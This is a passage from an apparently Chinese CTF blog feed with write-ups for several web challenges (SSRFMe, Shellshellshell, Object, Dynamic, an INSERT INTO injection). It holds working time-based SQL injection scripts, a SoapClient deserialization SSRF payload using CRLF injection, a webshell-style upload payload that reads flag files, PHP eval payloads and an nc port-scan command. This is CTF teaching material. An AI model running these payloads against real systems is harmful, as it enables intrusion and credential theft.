class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>先看<code>Exec()</code>函数:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def Exec(<span class="keyword">self</span>):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">self</span>.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"scan"</span> in <span class="keyword">self</span>.action:</span><br><span class="line">            tmpfile = open(<span class="string">"./%s/result.txt"</span> % <span class="keyword">self</span>.sandbox, <span class="string">'w'</span>)</span><br><span class="line">            resp = scan(<span class="keyword">self</span>.param)  <span class="comment"># 运行一个scan函数，参数可控</span></span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                result[<span class="string">'data'</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> in <span class="keyword">self</span>.action:</span><br><span class="line">            f = open(<span class="string">"./%s/result.txt"</span> % <span class="keyword">self</span>.sandbox, <span class="string">'r'</span>)</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>主要功能有<code>scan</code>和<code>read</code>；<code>scan</code>会执行一个scan()函数(param可控)、并将结果打印并存入result.txt，<code>read</code>将result.txt的内容读出来。</p><p>于是我们跟进scan()函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br></pre></td></tr></table></figure><p>发现可以读取本地文件，但是waf处有file和gopher的黑名单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>根据hint尝试访问./flag.txt，发现返回签名</p><p><img src="https://t1.picb.cc/uploads/2019/08/09/ghPwad.png" alt="img"></p><p>看一下验证签名的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>很容易想到hash拓展read读取flag</p><p><strong>思路：先访问flag.txt获取初始sign，然后hash拓展实现scan储存和read读取即可获取flag。</strong></p><p>hash长度拓展我这里用的是HashPump，原理可以参考我的另一篇文章：<a href="https://www.sketchplane.top/2019/06/05/Hash长度拓展攻击/#more">Hash长度拓展攻击</a></p><p><img src="https://t1.picb.cc/uploads/2019/08/09/ghPfEa.png" alt="img"></p><p><strong>注意：记得把’\x’换成’%’，另外key的长度是24不是16(包含’flag.txt’)</strong></p><p><img src="https://t1.picb.cc/uploads/2019/08/09/ghPIeu.png" alt="img"></p><p><strong>注意：Exec()函数和geneSign()函数在不同路由下，分别是’/De1ta’和’’/geneSign’</strong></p><p><strong>flag到手~</strong></p><h2 id="Shellshellshell"><a href="#Shellshellshell" class="headerlink" title="Shellshellshell"></a>Shellshellshell</h2><p>考察点：原题搜索(逃 、SoapClient类反序列化。</p><p>首先扫目录把源码down下来，然后开始审计：</p><p>发现insert()函数有点问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">    $db = <span class="keyword">new</span> Db();</span><br><span class="line">    @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">    <span class="keyword">if</span>($ret)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/09/26/gRFviu.png" alt=""></p><p>发现可以延时注入，于是跑一下admin的密码，写个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a24cf81d-16b9-45cc-9ab1-23b73378fba1.node2.buuoj.cn.wetolink.com:82/index.php?action=publish"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>: <span class="string">'4em1g9rscdc9mfvddp6nno8i17'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破长度</span></span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line"><span class="comment"># 字符集合</span></span><br><span class="line">character = <span class="string">"abcdef1234567890"</span></span><br><span class="line"><span class="comment"># 数据库名</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment"># 遍历每一个字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        signature = <span class="string">"123`,(if((ascii(substr((select password from ctf_users limit 1),%d,1)))=%d,sleep(5),1)))#"</span> % (i, ord(c))</span><br><span class="line">        mood = <span class="number">0</span></span><br><span class="line">        data = &#123;<span class="string">'signature'</span>: signature, <span class="string">'mood'</span>: mood&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            s.post(url, data=data, cookies=cookies, timeout=<span class="number">4.5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑一下脚本，即可得到admin的密码，尝试登录，发现登录失败，因为admin设置了非本地ip不允许登录，我们需要绕过<code>$_SERVER [‘REMOTE_ADDR’]</code>，很容易想到SSRF，再加上存在反序列化漏洞，这里可以考虑利用SoapClient原生类的反序列化来实现SSRF。</p><p>贴个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://xxx.xxx.xxx.xxx/index.php?action=login'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admiin&amp;password=jaivypassword&amp;code=(自己的验证码)'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=1234'</span> <span class="comment">#(未登录的cookie，便于以admin身份进行登陆)</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line"><span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type:application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length:'</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,</span><br><span class="line"><span class="string">'uri'</span>=&gt; <span class="string">"aaab"</span>));</span><br><span class="line"><span class="comment">//因为user-agent是可以控制的，因此可以利用crlf注入http头来发送post请求</span></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">'%0d%0a'</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'%26'</span>,$aaa);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将跑出的payloda注入进数据库，访问action=index即可触发反序列化，之后用新的Cookie登录，由于该Cookie与admin绑定，将会直接以admin身份登录，从而绕过了限制。</p><p>登录以后是一个裸传文件，直接上传一个shell，Antsword连接。</p><p>根据之前源码中的提示，flag应该在内网，于是我们康康本机地址和/etc/hosts，扫一下C段，发现在.7的80端口有php文件，wget保存下来一看，貌似又是一道原题：</p><p><img src="https://t1.picb.cc/uploads/2019/09/26/gRFNxv.png" alt=""></p><p>直接贴一个glzjin师傅的php脚本Orz：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt_array($curl, <span class="keyword">array</span>(</span><br><span class="line">  CURLOPT_URL =&gt; <span class="string">"http://172.16.54.2"</span>,</span><br><span class="line">  CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,</span><br><span class="line">  CURLOPT_ENCODING =&gt; <span class="string">""</span>,</span><br><span class="line">  CURLOPT_MAXREDIRS =&gt; <span class="number">10</span>,</span><br><span class="line">  CURLOPT_TIMEOUT =&gt; <span class="number">30</span>,</span><br><span class="line">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST =&gt; <span class="string">"POST"</span>,</span><br><span class="line">  CURLOPT_POSTFIELDS =&gt; <span class="string">"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"glzjin2.php\"\r\nContent-Type: false\r\n\r\n@&lt;?php echo `find /etc -name *flag* -exec cat &#123;&#125; +`;\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"hello\"\r\n\r\nglzjin2.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file[2]\"\r\n\r\n222\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file[1]\"\r\n\r\n111\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file[0]\"\r\n\r\n/../glzjin2.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSubmit\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"</span>,</span><br><span class="line">  CURLOPT_HTTPHEADER =&gt; <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22"</span>,</span><br><span class="line">    <span class="string">"cache-control: no-cache"</span>,</span><br><span class="line">    <span class="string">"content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"</span></span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response = curl_exec($curl);</span><br><span class="line">$err = curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($err) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"cURL Error #:"</span> . $err;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PS:</strong> nc扫描主机端口：<code>nc -z -v host_name port_range</code>。</p><p>最后即可获得flag：</p><p><img src="https://t1.picb.cc/uploads/2019/09/26/gRFbrL.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>shellshellshell这道题学到很多，之后应该会深入学习一下SoapClient的反序列化 ( 有时间的话，咕咕咕</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近深感自己语言基础差，得恶补一下了= =&lt;/p&gt;
&lt;h2 id=&quot;SSRFMe&quot;&gt;&lt;a href=&quot;#SSRFMe&quot; class=&quot;hea
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>一些基础题</title>
    <link href="https://www.sketchplane.top/2019/09/02/%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E9%A2%98/"/>
    <id>https://www.sketchplane.top/2019/09/02/%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E9%A2%98/</id>
    <published>2019-09-02T15:39:56.000Z</published>
    <updated>2019-09-03T02:35:46.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打比赛的时候一个变量覆盖看了半天，还是队里师傅提醒用php://input，发现自己基础很弱，于是把基础平台的Web刷了一遍，记录下一些有价值的题目。</p><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p><strong>考察点：PHP反序列化、一些小trick</strong></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag在flag.php里</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/\w+\((?R)?\)/'</span>, <span class="keyword">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a="'</span>.<span class="keyword">$this</span>-&gt;cmd.<span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hack!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'fl'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'ag'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(@highlight_file(<span class="string">'index.php'</span>,<span class="keyword">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(preg_match(<span class="string">'/[A-Za-z0-9]+\(/i'</span>, $_GET[<span class="string">'fl'</span>]))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack!!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> unserialize($_GET[<span class="string">'ag'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>思路非常清晰：fl绕过正则、ag传序列化对象并绕过正则；重写$this-&gt;cmd执行命令。</strong></p><p>但是这里面有几个需要注意的地方：</p><ul><li>ag正则的递归匹配</li><li>eval()的字符拼接</li><li>echo unserialize()报错问题</li></ul><p>ag的递归匹配限制了我们传进去的函数不能有参数，当然，能够函数套函数；eval(‘$a=”…you_payload…”;’)</p><p>需要我们构造语句进行拼接；像echo unserialize($_GET[‘a’])这种反序列化一般都是调用<code>__toString()</code>方法的，用__destruct()的话在本地会报错，我在本地删掉echo或者用 __toString()方法都能正常执行命令，但是题目环境就不行。。另外这里感谢<strong>@南溟</strong>师傅的指点hhh。</p><p><code>payload：?fl=php(&amp;ag=O:4:&quot;flag&quot;:1:{s:3:&quot;cmd&quot;;s:57:&quot;print_r&quot;;$a(file_get_contents(getcwd().&quot;/flag.php&quot;));$b=&quot;&quot;;&quot;}</code></p><p><strong>PS：这里由于不能给函数传参，从手册中查了一个获取当前目录的getcwd()函数，然后拼接出flag.php的绝对路径。</strong></p><h2 id="Dynamic"><a href="#Dynamic" class="headerlink" title="Dynamic"></a>Dynamic</h2><p><strong>考察点：PHP动态函数执行</strong></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$blacklist = [<span class="string">"system"</span>, <span class="string">"ini_set"</span>, <span class="string">"exec"</span>, <span class="string">"scandir"</span>, <span class="string">"shell_exec"</span>, <span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$blacklist = array_merge($blacklist, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($blacklist <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[cmd], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[cmd]);</span><br></pre></td></tr></table></figure><p>注意到可以命令执行，但是有黑名单，黑名单绕过姿势很多，关键是<code>$blacklist = array_merge($blacklist, get_defined_functions()[&#39;internal&#39;]);</code>这句，把内置函数都给加进黑名单了。。。</p><p>正好最近P神在<code>Kcon</code>上演讲的内容就是<code>php的动态特性</code>，之前也看到过他写的类似文章，这里直接写payload：</p><p><code>payload：?cmd=$a=&#39;php&#39;.&#39;info&#39;;$a();</code></p><h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p><strong>考察点：时间注入脚本编写</strong></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>发现是XFF注入，另外过滤了”,”。</p><p>由于输入什么都没有回显，这里尝试时间盲注，发现可行；逗号过滤用<code>from for</code>代替，直接上脚本。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破长度</span></span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line"><span class="comment"># 字符集合</span></span><br><span class="line">character = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"><span class="comment"># 数据库名</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment"># 遍历每一个字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        xff = <span class="string">"1' and case when substr((select flag from flag) from %d for 1)='%s'  then sleep(5) else 1 end and '1'='1"</span> % (i, c)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            header = &#123;<span class="string">'X-Forwarded-For'</span>: xff&#125;</span><br><span class="line">            s.get(url, headers=header, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><strong>PS：盲注时先手工判断语句与回显再编写脚本。</strong></p><h2 id="这是一个神奇的登陆框"><a 